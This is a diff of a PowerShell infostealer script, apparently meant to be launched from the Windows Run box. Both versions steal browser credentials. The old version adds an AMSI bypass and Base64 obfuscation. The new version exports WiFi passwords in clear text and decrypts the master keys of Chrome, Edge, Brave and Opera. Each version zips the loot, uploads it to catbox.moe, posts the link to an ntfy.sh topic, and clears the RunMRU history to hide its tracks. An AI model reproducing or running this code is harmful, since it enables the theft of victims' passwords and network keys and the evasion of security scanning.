@@ -1,42 +1,59 @@
-# --- STAGE 1: THE BLINDER ---
-# This "unhooks" the scanner so it stops watching this window
-$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true)
+$topic = "data_stwealer_hideen_"
 
-# --- STAGE 2: THE DECEPTION ---
-# We use random variable names and hide 'Chrome'/'Edge' in Base64
-$u1 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Y2hyb21l"))
-$u2 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("bXNlZGdl"))
+# 1. Load Security
+try {
+    Add-Type -AssemblyName System.Security
+} catch { exit }
 
-# Stop processes silently
-Stop-Process -Name $u1, $u2 -Force -ErrorAction SilentlyContinue
+# 2. Workspace Setup
+$dir = "$env:TEMP\SysCache_$(Get-Random)"; $zip = "$env:TEMP\UpdatePkg.zip"
+if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }; mkdir $dir | Out-Null
 
-# Create a workspace with a boring name like 'SystemUpdate'
-$w = "$env:TEMP\WinUpdate_$(Get-Random)"
-mkdir $w -Force | Out-Null
+# 3. WiFi Export
+netsh wlan export profile folder=$dir key=clear | Out-Null
 
-# --- STAGE 3: THE DATA GRAB ---
-# Instead of saying 'Login Data', we use wildcards
-$p = @("$env:LOCALAPPDATA\Google\Chrome\User Data\*", "$env:LOCALAPPDATA\Microsoft\Edge\User Data\*")
-foreach ($folder in $p) {
-    Get-ChildItem -Path $folder -Include "*State*", "*Login*" -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination $w -Force -ErrorAction SilentlyContinue
+# 4. Browser Looting (v2.4 Logic)
+$browsers = @{
+    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
+    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
+    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable\Local State"
 }
 
-# --- STAGE 4: THE UPLOAD ---
-$z = "$env:TEMP\UpdatePkg.zip"
-[void][Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem")
-[System.IO.Compression.ZipFile]::CreateFromDirectory($w, $z)
-
-# Using a standard User-Agent to look like a real person browsing the web
-$u = "https://catbox.moe/user/api.php"
-$r = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$z" $u -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-
-# Send the link to ntfy
-if ($r -like "http*") {
-    $topic = "data_stwealer_hideen_"
-    curl.exe -X POST -d "Update: $r" "https://ntfy.sh/$topic"
+foreach ($b in $browsers.Keys) {
+    $path = $browsers[$b]
+    if (Test-Path $path) {
+        try {
+            $json = Get-Content $path -Raw | ConvertFrom-Json
+            $eK = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
+            $uK = [System.Security.Cryptography.ProtectedData]::Unprotect($eK[5..($eK.Length-1)], $null, 'CurrentUser')
+            [System.BitConverter]::ToString($uK) -replace '-' | Out-File "$dir\${b}_key.txt"
+            
+            $db = $path.Replace("Local State", "Default\Login Data")
+            if ($b -eq "Opera") { $db = $path.Replace("Local State", "Login Data") }
+            
+            if (Test-Path $db) {
+                Copy-Item $db -Destination "$dir\${b}_data.db" -Force -ErrorAction SilentlyContinue
+            }
+        } catch { continue }
+    }
 }
 
-# --- STAGE 5: GHOST EXIT ---
+# 5. Packaging & Upload
+Add-Type -AssemblyName "System.IO.Compression.FileSystem"
+[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
+$link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php
+
+if ($link -like "http*") {
+    Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot Found: $link"
+}
+
+# 6. GHOST CLEANUP & EXIT
+# Wipe the Run box history so no one sees the GitHub URL
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
-Remove-Item -Recurse -Force $w, $z -ErrorAction SilentlyContinue
+
+# Delete the temp files
+Remove-Item -Recurse -Force $dir, $zip -ErrorAction SilentlyContinue
+
+# Close the window automatically
 exit
